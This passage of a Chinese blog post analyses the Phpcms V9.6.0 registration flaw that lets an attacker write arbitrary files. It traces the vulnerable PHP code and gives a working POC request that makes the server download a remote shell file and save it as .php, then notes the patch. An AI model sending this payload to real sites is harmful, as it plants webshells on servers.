class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来看到这串正则：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match_all(&quot;/(href|src)=([\&quot;|&apos;]?)([^ \&quot;&apos;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;</span><br></pre></td></tr></table></figure>
+<p>作用就是检测后缀名，如果不是<code>gif|jpg|jpeg|bmp|png</code>格式的，就是返回原url，直接退出。这边可以直接绕过：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-phpcms1.png" alt="phpcms1"></p>
+<p>继续向下，看到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">			dir_create($uploaddir);</span><br><span class="line">			$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的<code>$matches[3]</code>就是<code>http://127.0.0.1/shell.txt.php.jpg</code></p>
+<p>又经过了<code>fillurl</code>方法的处理，跟进去看一下，看到关键的地方：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$BaseUrlPath = preg_replace(<span class="string">"/\/([^\/]*)\.(.*)$/"</span>,<span class="string">'/'</span>,$BaseUrlPath);</span><br><span class="line">$BaseUrlPath = preg_replace(<span class="string">"/\/$/"</span>,<span class="string">''</span>,$BaseUrlPath);</span><br><span class="line">$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br></pre></td></tr></table></figure>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-phpcms2.png" alt="phpcms2"></p>
+<p><code>$BaseUrlPath=&#39;/127.0.0.1/shell.txt.php.jpg&#39;</code></p>
+<p>下一个正则将<code>/</code>去掉，以方便后面的操作：</p>
+<p><code>$BaseUrlPath=&#39;127.0.0.1shell.txt.php.jpg&#39;</code></p>
+<p>接下来看到对于url进行了一个关键的处理：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br></pre></td></tr></table></figure>
+<p>也就是说如果我们构造一个类似于<code>http://127.0.0.1/shell.txt.php#.jpg</code></p>
+<p>再对url进行重组后：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">			$preurl = strtolower(substr($surl,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">			<span class="keyword">if</span>(strlen($surl)&lt;<span class="number">7</span>)</span><br><span class="line">			$okurl = <span class="string">'http://'</span>.$BaseUrlPath.<span class="string">'/'</span>.$surl;</span><br><span class="line">			<span class="keyword">elseif</span>($preurl==<span class="string">"http:/"</span>||$preurl==<span class="string">'ftp://'</span> ||$preurl==<span class="string">'mms://'</span> || $preurl==<span class="string">"rtsp://"</span> || $preurl==<span class="string">'thunde'</span> || $preurl==<span class="string">'emule:'</span>|| $preurl==<span class="string">'ed2k:/'</span>)</span><br><span class="line">			$okurl = $surl;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			$okurl = <span class="string">'http://'</span>.$BaseUrlPath.<span class="string">'/'</span>.$surl;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+<p>最后返回的<code>$surl=http://127.0.0.1/shell.txt.php</code>并且同时满足前面对于后缀名的限制。</p>
+<p>回到<code>download</code>方法中，接下来的操作对文件名进行了重组：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line">			<span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">			$filename = fileext($file);</span><br><span class="line">			$file_name = basename($file);</span><br><span class="line">			$filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">			$newfile = $uploaddir.$filename;</span><br></pre></td></tr></table></figure>
+<p>首先在这里截取最后一个<code>.</code>之后的后缀作为后缀名：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fileext</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> strtolower(trim(substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>, <span class="number">10</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最终的文件名就变成了<code>.php</code>结尾的文件。</p>
+<p>之后，<code>$upload_func = $this-&gt;upload_func;</code>，而<code>$this-&gt;upload_func = &#39;copy&#39;;</code>。即调用<code>copy</code>方法进行远程文件下载。</p>
+<h3 id="2-上传路径部分"><a href="#2-上传路径部分" class="headerlink" title="2. 上传路径部分"></a>2. 上传路径部分</h3><p>看一下我们上传的文件的命名情况：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getname</span><span class="params">($fileext)</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> date(<span class="string">'Ymdhis'</span>).rand(<span class="number">100</span>, <span class="number">999</span>).<span class="string">'.'</span>.$fileext;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>上传的路径：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploadpath = $upload_url.$dir;</span><br></pre></td></tr></table></figure>
+<p>而</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'upload_path'</span> =&gt; PHPCMS_PATH.<span class="string">'uploadfile/'</span>,</span><br></pre></td></tr></table></figure>
+<p>上传路径就是<code>uploadfile/年月日时间具体到秒+3位100-999的随机数+文件后缀</code></p>
+<p>这样看，其实可以直接写脚本对文件名进行枚举。</p>
+<p>有没有更简单的方法呢？有。</p>
+<p>回到<code>register</code>方法中，向下看：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(pc_base::load_config(<span class="string">'system'</span>, <span class="string">'phpsso'</span>)) &#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;_init_phpsso();</span><br><span class="line">				$status = <span class="keyword">$this</span>-&gt;client-&gt;ps_member_register($userinfo[<span class="string">'username'</span>], $userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'email'</span>], $userinfo[<span class="string">'regip'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line">				<span class="keyword">if</span>($status &gt; <span class="number">0</span>) &#123;</span><br><span class="line">					$userinfo[<span class="string">'phpssouid'</span>] = $status;</span><br><span class="line">					<span class="comment">//传入phpsso为明文密码，加密后存入phpcms_v9</span></span><br><span class="line">					$password = $userinfo[<span class="string">'password'</span>];</span><br><span class="line">					$userinfo[<span class="string">'password'</span>] = password($userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line">					$userid = <span class="keyword">$this</span>-&gt;db-&gt;insert($userinfo, <span class="number">1</span>);</span><br><span class="line">					<span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;	<span class="comment">//如果开启选择模型</span></span><br><span class="line">						$user_model_info[<span class="string">'userid'</span>] = $userid;</span><br><span class="line">						<span class="comment">//插入会员模型数据</span></span><br><span class="line">						<span class="keyword">$this</span>-&gt;db-&gt;set_model($userinfo[<span class="string">'modelid'</span>]);</span><br><span class="line">						<span class="keyword">$this</span>-&gt;db-&gt;insert($user_model_info);</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>
+<p>也就是说会将<code>$userid</code>加入<code>$user_model_info</code>数组中再进行数据库的插入操作（会员新增操作，对应的v9_member_detail数据表）:</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-phpcms3.png" alt="phpcms3"></p>
+<p>只有两个字段，<code>userid</code>与<code>birthday</code>。但由于$user_model_info数组已经包含了我们之前构造提交的info[content]=xxxxxx的内容，而在插入数据库的时候又没有content字段，所以会导致数据库报错，从而将我们构造的xxxxxx的内容给回显出来，所以就不用暴力去破解文件名了。</p>
+<h3 id="3-POC解释"><a href="#3-POC解释" class="headerlink" title="3. POC解释"></a>3. POC解释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siteid=1&amp;modelid=1&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://127.0.0.1/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure>
+<p>?后的<code>.php</code>被当做shell.txt的参数，所以复制的是shell.txt的内容。</p>
+<h1 id="0x03-diff比较"><a href="#0x03-diff比较" class="headerlink" title="0x03 diff比较"></a>0x03 diff比较</h1><p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-phpcms4.png" alt="phpcms4"></p>
+<p>简单粗暴的对处理后的文件后缀进行检测。</p>
+<h1 id="0x04-修补方案"><a href="#0x04-修补方案" class="headerlink" title="0x04 修补方案"></a>0x04 修补方案</h1><p>更新吧</p>
+<h1 id="0x05-最后吐槽一句"><a href="#0x05-最后吐槽一句" class="headerlink" title="0x05 最后吐槽一句"></a>0x05 最后吐槽一句</h1><p>顺便把phpcms的源码看了一下，发现phpcms对于安全性的验证真的是简单粗暴，只要是个交互的地方就要调一遍过滤函数，这样死板的做法，可能在安全上会有一些益处，但是势必会对以后的扩展造成阻碍。</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://lucifaer.com">Lucifaer</a>
+            <p>原文链接: <a href="https://lucifaer.com/2017/04/13/Phpcms V9.6.0任意文件写入getshell/">https://lucifaer.com/2017/04/13/Phpcms V9.6.0任意文件写入getshell/</a>
+            <p>发表日期: <a href="https://lucifaer.com/2017/04/13/Phpcms V9.6.0任意文件写入getshell/">April 13th 2017, 4:41:00 pm</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2017/05/09/五指CMS任意文件下载漏洞/" title= 五指CMS任意文件下载漏洞 >
+                    <div class="nextTitle">五指CMS任意文件下载漏洞</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2017/02/06/WordPress REST API 内容注入/" title= WordPress REST API 内容注入 >
+                    <div class="prevTitle">WordPress REST API 内容注入</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zODcyOC8xNTI1Ng==>
+        <script type="text/javascript">
+            (function(d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+         
+                if (typeof LivereTower === 'function') { return; }
+         
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+         
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+             </script>
+         <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:l.lucifaer@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Lucifaer" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//weibo.com/5838222069" class="iconfont-archer weibo" target="_blank" title=weibo></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-漏洞简述"><span class="toc-number">1.</span> <span class="toc-text">0x00 漏洞简述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-漏洞简介"><span class="toc-number">1.1.</span> <span class="toc-text">1. 漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-漏洞影响版本"><span class="toc-number">1.2.</span> <span class="toc-text">2. 漏洞影响版本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞复现"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#静态分析"><span class="toc-number">3.1.</span> <span class="toc-text">静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-文件上传部分"><span class="toc-number">3.1.1.</span> <span class="toc-text">1. 文件上传部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-上传路径部分"><span class="toc-number">3.1.2.</span> <span class="toc-text">2. 上传路径部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-POC解释"><span class="toc-number">3.1.3.</span> <span class="toc-text">3. POC解释</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-diff比较"><span class="toc-number">4.</span> <span class="toc-text">0x03 diff比较</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-修补方案"><span class="toc-number">5.</span> <span class="toc-text">0x04 修补方案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-最后吐槽一句"><span class="toc-number">6.</span> <span class="toc-text">0x05 最后吐槽一句</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 18
+        </div>
+        <!-- search  -->
+        
+            <div class="site-search popup-trigger">
+                <span class="iconfont-archer search-icon">&#xe627;</span>
+            </div>
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2018/07/19/薅羊毛产业链分析/" >薅羊毛产业链分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2018/06/18/以太坊简介/" >以太坊简介</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2018/06/18/比特币简介/" >比特币简介</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2018/06/18/区块链补充/" >区块链补充</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2018/06/18/区块链基础概念/" >区块链基础概念</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/2018/03/02/部署Django/" >部署Django</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/28</span><a class="archive-post-title" href= "/2018/02/28/Git Hooks实现项目的自动部署/" >Git Hooks实现项目的自动部署</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "/2017/10/09/XDCTF Upload 引发出来的一个新思路/" >XDCTF Upload 引发出来的一个新思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href= "/2017/07/20/Blackhat SEO/" >Blackhat SEO</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2017/07/19/PHP反序列化漏洞/" >PHP反序列化漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2017/05/27/Joomla 框架的简单跟进/" >Joomla 框架的简单跟进</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/2017/05/09/五指CMS任意文件下载漏洞/" >五指CMS任意文件下载漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/13</span><a class="archive-post-title" href= "/2017/04/13/Phpcms V9.6.0任意文件写入getshell/" >Phpcms V9.6.0任意文件写入getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/06</span><a class="archive-post-title" href= "/2017/02/06/WordPress REST API 内容注入/" >WordPress REST API 内容注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2017/01/18/SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析/" >SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2016 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2016/08/11/CVE-2016-6483 vBulletin 5.2.2 SSRF漏洞/" >CVE-2016-6483 vBulletin 5.2.2 SSRF漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span><a class="archive-post-title" href= "/2016/08/09/IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）/" >IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href= "/2016/07/01/Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）/" >Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="黑产研究"><span class="iconfont-archer">&#xe606;</span>黑产研究</span>
+    
+        <span class="sidebar-tag-name" data-tags="BlackHat SEO"><span class="iconfont-archer">&#xe606;</span>BlackHat SEO</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="安全研究"><span class="iconfont-archer">&#xe606;</span>安全研究</span>
+    
+        <span class="sidebar-tag-name" data-tags="Joomla"><span class="iconfont-archer">&#xe606;</span>Joomla</span>
+    
+        <span class="sidebar-tag-name" data-tags="Git"><span class="iconfont-archer">&#xe606;</span>Git</span>
+    
+        <span class="sidebar-tag-name" data-tags="环境部署"><span class="iconfont-archer">&#xe606;</span>环境部署</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="blockchain"><span class="iconfont-archer">&#xe606;</span>blockchain</span>
+    
+        <span class="sidebar-tag-name" data-tags="薅羊毛"><span class="iconfont-archer">&#xe606;</span>薅羊毛</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="黑产研究"><span class="iconfont-archer">&#xe60a;</span>黑产研究</span>
+    
+        <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
+    
+        <span class="sidebar-category-name" data-categories="安全研究"><span class="iconfont-archer">&#xe60a;</span>安全研究</span>
+    
+        <span class="sidebar-category-name" data-categories="环境部署"><span class="iconfont-archer">&#xe60a;</span>环境部署</span>
+    
+        <span class="sidebar-category-name" data-categories="一些思路"><span class="iconfont-archer">&#xe60a;</span>一些思路</span>
+    
+        <span class="sidebar-category-name" data-categories="blockchain"><span class="iconfont-archer">&#xe60a;</span>blockchain</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Lucifaer"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+        <div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="iconfont-archer">&#xe609;</i>
+    </span>
+  </div>
+</div>
+        <script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.8.0/dist/instantsearch.min.js" defer></script>
+        <script src="/scripts/search.js" defer></script>
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
